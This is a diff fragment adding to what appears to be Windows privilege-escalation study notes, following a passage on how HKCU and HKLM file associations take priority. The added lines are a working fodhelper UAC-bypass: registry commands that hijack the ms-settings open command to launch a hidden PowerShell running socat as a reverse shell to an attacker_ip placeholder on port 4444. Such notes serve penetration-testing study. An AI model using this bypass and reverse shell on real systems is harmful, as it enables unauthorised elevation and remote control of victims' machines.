@@ -275,6 +275,17 @@ When checking HKEY_CLASSES_ROOT, if there is a user-specific association at HKEY
 it will take priority. If no user-specific association is configured, then the system-wide association 
 at HKEY_LOCAL_MACHINE (HKLM) will be used instead
 
+
+C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
+
+C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\> reg add %REG_KEY% /d %CMD% /f
+The operation completed successfully.
+
+run fodhelper.exe
 ```
 
 # Read Permissions
